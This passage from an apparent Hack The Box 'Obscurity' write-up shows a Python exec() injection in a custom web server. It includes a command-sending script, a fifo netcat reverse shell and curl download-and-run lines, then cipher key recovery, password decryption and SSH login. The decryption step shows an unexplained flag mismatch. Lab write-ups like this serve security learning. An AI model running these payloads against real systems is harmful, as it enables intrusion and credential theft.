href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">dangerous</a> and open door to injections.  </p><p>Let’s see if we can use this flow to achieve remote code execution on the server.<br>Can we inject code in <code>info</code> variable ?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = <span class="string">&quot;output = &#x27;Document: &#123;&#125;&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p>Nope… <code>path</code> then?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span>(<span class="params">self, request</span>):</span></span><br><span class="line">    req = request.strip(<span class="string">&quot;\r&quot;</span>).split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    method,doc,vers = req[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">[...]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span>(<span class="params">self, request, conn, address</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.good:</span><br><span class="line">        document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">[...]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span>(<span class="params">self, path, docRoot</span>):</span></span><br><span class="line">    path = urllib.parse.unquote(path)</span><br></pre></td></tr></table></figure><p>As we could have have guess <code>path</code> contains the url requested to the server and, good news for us, no sanitization is being made.  </p><p>In the same way as SQL injection, let’s try to inject Python code that will lead to remote code injection on the server.</p><p>Let’s create a simplified script to do so with information we have:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="built_in">input</span>(<span class="string">&quot;Command to execute: &quot;</span>)</span><br><span class="line">info = <span class="string">&quot;output = &#x27;Document: &#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(info.<span class="built_in">format</span>(path))</span><br></pre></td></tr></table></figure><p>So let’s see what would happen if we pass an <code>os</code> command as path? Let’s try with <code>os.system(&#39;sleep 5&#39;)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python injection.py</span><br><span class="line">Command to execute: os.system(<span class="string">&#x27;sleep 5&#x27;</span>)</span><br><span class="line">output = <span class="string">&#x27;Document: os.system(&#x27;</span>sleep 5<span class="string">&#x27;)&#x27;</span></span><br></pre></td></tr></table></figure><p>This is not going to work, we will need to escape the python command, let’s give it another try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python injection.py</span><br><span class="line">Command to execute: <span class="string">&#x27;;os.system(&#x27;</span>sleep 5<span class="string">&#x27;);&#x27;</span></span><br><span class="line">output = <span class="string">&#x27;Document: &#x27;</span>;os.system(<span class="string">&#x27;sleep 5&#x27;</span>);<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>Looks good to me and doesn’t throw error, let’s add the same <code>exec()</code> than in the original to make sure the injection will work properly against the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">&quot;&#x27;;os.system(&#x27;sleep 5&#x27;);&#x27;&quot;</span></span><br><span class="line">info = <span class="string">&quot;output = &#x27;Document: &#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="built_in">exec</span>(info.<span class="built_in">format</span>(path))</span><br></pre></td></tr></table></figure><p>And let’s run it, if it hang for 5 seconds then it mean our injection was successful:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ time python injection.py</span><br><span class="line">python tmp.py  0.02s user 0.01s system 0% cpu 5.029 total</span><br></pre></td></tr></table></figure><p>It worked perfectly. Let’s now gather everything we know to achieve remote code execution on the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://obscurity.htb:8080/&#x27;;os.system(&#x27;&#123;&#125;&#x27;);&#x27;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&quot;Command to execute: &quot;</span>)</span><br><span class="line">    r = requests.get(url.<span class="built_in">format</span>(cmd))</span><br></pre></td></tr></table></figure><p>We will try to execute a reserve shell. After having no luck getting the classical <code>netcat</code> nor <code>python</code> reverse shell to work (which is strange since we know python is running on the box), I managed to get the <a href="https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498"><code>fifo netcat</code></a> reverse shell to work:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.sh</span><br><span class="line">rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 8585 &gt;/tmp/h</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Then we open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And finally we send our payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python rce.py</span><br><span class="line">Command to execute: curl 10.10.10.10:8000/hg8.sh -o /tmp/hg8.sh</span><br><span class="line">Command to execute: bash /tmp/hg8.sh</span><br></pre></td></tr></table></figure><p>Aand we get the connection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.168:43378</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p><em>Note: Looking around we immediately notice that the python bin used is <code>pyhton3</code> that’s why the common <code>python</code> shell wasn’t working. As usual it’s easy to overlook simple blockers like this one…</em></p><h3 id="Pivot-www-data-gt-Robert"><a href="#Pivot-www-data-gt-Robert" class="headerlink" title="Pivot www-data -&gt; Robert"></a>Pivot www-data -&gt; Robert</h3><p>Quick recon shows that the user is <code>robert</code> and have a few interesting files we can read:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/$ ls -l /home/robert/</span><br><span class="line">ls -l /home/robert/</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH</span><br><span class="line">-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt</span><br><span class="line">-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt</span><br><span class="line">-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt</span><br><span class="line">-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py</span><br><span class="line">-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt</span><br></pre></td></tr></table></figure><p><code>passwordreminder.txt</code> sure looks interesting… Let’s check it out:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/$ cat passwordreminder.txt</span><br><span class="line">´ÑÈÌÉàÙÁÑé¯·¿k</span><br></pre></td></tr></table></figure><p>It’s encrypted. What else do we have ? Let’s see for <code>check.txt</code> and <code>out.txt</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/$ cat check.txt</span><br><span class="line">Encrypting this file with your key should result <span class="keyword">in</span> out.txt, make sure your key is correct!</span><br><span class="line">www-data@obscure:/home/robert/$ cat out.txt</span><br><span class="line">¦ÚÈêÚÞØÛÝÝ ×ÐÊß ÞÊÚÉ æßÝË ÚÛÚê ÙÉë éÑÒÝÍÐ êÆáÙÞã ÒÑ ÐáÙ¦ÕæØ ãÊÎÍ ßÚêÆ Ýáäè ÎÍÚ Îë ÑÓäáÛÌ×  v</span><br></pre></td></tr></table></figure><p>That’s interesting. <code>check.txt</code> explain that encrypting this same file will result in <code>out.txt</code> with a given key. We have both clear text message and it’s encrypted version. </p><p>Something also catch my eye. Did you notice that the encrypted version contain the same number of characters and the same spaces placement than the clear text one? </p><p>We can say with confidence that the encryption mechanism seems to simply encrypt each letter one by one using the key somehow. Let’s see if we can find more informations and possibly retrieve the key. If we find the key, we can decipher the <code>passwordreminder.txt</code> that will allow us to progress.</p><p>We didn’t take a look at <code>SuperSecureCrypt.py</code>, it’s easy to guess that it’s the script used to encrypt those file. This is the script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    keylen = <span class="built_in">len</span>(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = <span class="built_in">ord</span>(x)</span><br><span class="line">        newChr = <span class="built_in">chr</span>((newChr + <span class="built_in">ord</span>(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    keylen = <span class="built_in">len</span>(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = <span class="built_in">ord</span>(x)</span><br><span class="line">        newChr = <span class="built_in">chr</span>((newChr - <span class="built_in">ord</span>(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        decrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Encrypt with 0bscura\&#x27;s encryption algorithm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;InFile&#x27;</span>,</span><br><span class="line">                    <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;The file to read&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;OutFile&#x27;</span>,</span><br><span class="line">                    <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;Where to output the encrypted/decrypted file&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-k&#x27;</span>,</span><br><span class="line">                    metavar=<span class="string">&#x27;Key&#x27;</span>,</span><br><span class="line">                    <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;Key to use&#x27;</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Decrypt mode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&quot;################################\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;#           BEGINNING          #\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;#    SUPER SECURE ENCRYPTOR    #\n&quot;</span></span><br><span class="line">banner+= <span class="string">&quot;################################\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  ############################\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  #        FILE MODE         #\n&quot;</span></span><br><span class="line">banner += <span class="string">&quot;  ############################&quot;</span></span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="keyword">if</span> args.o == <span class="literal">None</span> <span class="keyword">or</span> args.k == <span class="literal">None</span> <span class="keyword">or</span> args.i == <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Missing args&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> args.d:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Opening file &#123;0&#125;...&quot;</span>.<span class="built_in">format</span>(args.i))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.i, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decrypting...&quot;</span>)</span><br><span class="line">        decrypted = decrypt(data, args.k)</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Writing to &#123;0&#125;...&quot;</span>.<span class="built_in">format</span>(args.o))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.o, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Opening file &#123;0&#125;...&quot;</span>.<span class="built_in">format</span>(args.i))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.i, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Encrypting...&quot;</span>)</span><br><span class="line">        encrypted = encrypt(data, args.k)</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Writing to &#123;0&#125;...&quot;</span>.<span class="built_in">format</span>(args.o))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(args.o, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(encrypted) </span><br></pre></td></tr></table></figure><p>Let’s break it down to better understand how it works: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Encrypt with 0bscura\&#x27;s encryption algorithm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, metavar=<span class="string">&#x27;InFile&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;The file to read&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, metavar=<span class="string">&#x27;OutFile&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Where to output the encrypted/decrypted file&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-k&#x27;</span>, metavar=<span class="string">&#x27;Key&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Key to use&#x27;</span>, required=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>Reading the <code>argparse</code>  we can quickly understand what’s this script will encrypt and decrypt a given file using a given key. </p><p>The function that interesting us is the encrypt function. Why is it interesting ? Because we have a clear text file and it’s encrypted version (<code>check.txt</code> and <code>out.txt</code>).</p><p>The encrypt function looks like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    keylen = <span class="built_in">len</span>(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = <span class="built_in">ord</span>(x)</span><br><span class="line">        newChr = <span class="built_in">chr</span>((newChr + <span class="built_in">ord</span>(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br></pre></td></tr></table></figure><p>12 lines, taking it step by step we should have a good understanding of what it is doing. </p><p>Let’s start! </p><p>The function take 2 arguments, the text to encrypt and the secret key. Nothing surprising yet. </p><p>Second, third and fourth line respectively get the length of the key, initialize <code>keyPos</code> to <code>0</code> (which we can understand means “key position”) and initialize the <code>encrypted</code> variable that will for sure hold the final encrypted content since it’s returned at the end of the function.</p><p>The <code>for</code> loop every character of the content to encrypt, this seems to confirm our previous assumption that the content is encrypted letter-by-letter. </p><p>Inside the for loop, the encrypt mechanism takes place. </p><p> <code>keyChr = key[keyPos]</code> get the secret key letter position. For example if the secret password is <code>hg8</code> then at the first loop, <code>keyChr</code> will be <code>h</code>, second loop it will be <code>g</code> and third loop <code>8</code> since <code>keyPos</code> get incremented by one at the end of the loop.</p><p>Then, <code>ord()</code> function is used on the letter to encrypt. <a href="https://docs.python.org/3/library/functions.html#ord">Python documentation</a> explain:</p><blockquote><p>Given a string representing one Unicode character, return an integer<br>representing the Unicode code point of that character. For example, <code>ord(&#39;a&#39;)</code> returns the integer <code>97</code> and <code>ord(&#39;€&#39;)</code> (Euro sign)<br>returns <code>8364</code>. This is the inverse of <a href="https://docs.python.org/3/library/functions.html#chr" title="chr"><code>chr()</code></a>.</p></blockquote><p>Next line is where the Magic happens. Let’s break it down:</p><ol><li><p><code>newChr + ord(keyChr)</code> : The integer unicode code of the character to encrypt gets added to the integer unicode code of the current key character.</p></li><li><p><code>(newChr + ord(keyChr)) % 255)</code> gets the remainder from the division of the <code>keyChr</code> addition by <code>255</code> to make sure it doesn’t not exceed the Unicode code list.</p></li><li><p>Finally we convert the result integer of the operation back to string using <code>chr()</code></p></li></ol><p>The encrypted character then gets added to the final <code>encrypted</code> variable with <code>encrypted += newChr</code></p><p>The last two lines increments the key position, so that the next characters to be encrypted will be encrypted from the next character of the secret key and so on.</p><p><code>keyPos = keyPos % keylen</code> will restart the key position once we are at the end of the key. For example with <code>hg8</code> as a key, this is what will happen when <code>keyPos</code> is <code>3</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyPos = keyPos % keylen</span><br><span class="line">keyPos =   <span class="number">3</span>    %    <span class="number">3</span>    </span><br><span class="line">keyPos = <span class="number">0</span> <span class="comment"># keyPos will be 0 since 3 divided by 3 gets 0 as remainder</span></span><br></pre></td></tr></table></figure><p>Alright ! This seems pretty clear now (and not very robust encryption).</p><p>I am not going to describe the <code>decrypt()</code> function since it’s exactly the same but inverted.</p><p>Let’s now focus on how, from an encrypted string and it’s clear-text equivalent, we can find back the secret key used.</p><h3 id="Recovering-the-secret-key"><a href="#Recovering-the-secret-key" class="headerlink" title="Recovering the secret key"></a>Recovering the secret key</h3><p>Seeing the encrypt logic it’s easy to understand how to get back the key from an clear string and it’s encrypted equivalent :</p><blockquote><p>Clear character + Key Character = Encrypted Character</p><p>Key Character = Encrypted Character - Clear character</p></blockquote><p>With that in mind we are going to write a little script to recover the secret key used to encrypt <code>check.txt</code> to <code>out.txt</code>. To start we will input both clear and encrypted value:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clear = <span class="string">&quot;Encrypting this file with your key should result in out.txt, make sure your key is correct!&quot;</span></span><br><span class="line">encrypted = <span class="string">&quot;¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v&quot;</span></span><br></pre></td></tr></table></figure><p>Here you need to be careful when copy pasting, because space of the encrypted version are not “usual” spaces and could mess up your script if you paste it as normal spaces. Here is how it should looks like (in vim for example):</p><p><img src="https://user-images.githubusercontent.com/9076747/72752623-f6e33100-3bc2-11ea-92b6-a025983eb467.png"></p><p>Here is the final script I made:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_key</span>(<span class="params">clear, encrypt</span>):</span></span><br><span class="line">    key = <span class="string">&quot;&quot;</span></span><br><span class="line">    position_clear = <span class="number">0</span></span><br><span class="line">    position_encrypt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> clear:</span><br><span class="line">        clear_char = clear[position_clear]</span><br><span class="line">        encrypt_char = encrypt[position_encrypt]</span><br><span class="line">        key_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(encrypt_char) - <span class="built_in">ord</span>(clear_char))</span><br><span class="line">        key += key_char</span><br><span class="line">        position_clear += <span class="number">1</span></span><br><span class="line">        position_encrypt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key </span><br><span class="line"></span><br><span class="line">clear = <span class="string">&quot;Encrypting this file with your key should result in out.txt, make sure your key is correct!&quot;</span></span><br><span class="line">encrypt = <span class="string">&quot;¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v&quot;</span></span><br><span class="line"></span><br><span class="line">key = recover_key(clear, encrypt)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><p>Let’s run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python get_secret_key.py</span><br><span class="line">alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich</span><br></pre></td></tr></table></figure><p>Looks good! The key is repeating (remember <code>keyPos = keyPos % keylen</code>) but we can easily see it’s <code>alexandrovich</code>. Let’s try to use it to decrypt <code>passwordreminder.txt</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/$ python SuperSecureCrypt.py -i passwordreminder.txt -o passwordreminder.clear.txt -k alexandrovich</span><br><span class="line"><span class="comment">################################</span></span><br><span class="line"><span class="comment">#           BEGINNING          #</span></span><br><span class="line"><span class="comment">#    SUPER SECURE ENCRYPTOR    #</span></span><br><span class="line"><span class="comment">################################</span></span><br><span class="line">  <span class="comment">############################</span></span><br><span class="line">  <span class="comment">#        FILE MODE         #</span></span><br><span class="line">  <span class="comment">############################</span></span><br><span class="line">Opening file passwordreminder.txt...</span><br><span class="line">Encrypting...</span><br><span class="line">Writing to passwordreminder.clear.txt...</span><br><span class="line">www-data@obscure:/home/robert/$ cat passwordreminder.clear.txt</span><br><span class="line">SecThruObsFTW</span><br></pre></td></tr></table></figure><p>Let’s try to login to Robert account with this password: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh robert@obscurity.htb</span><br><span class="line">robert@obscurity.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 22 14:56:30 2020 from 10.10.14.9</span></span><br><span class="line"><span class="string">robert@obscure:~$ cat user.txt</span></span><br><span 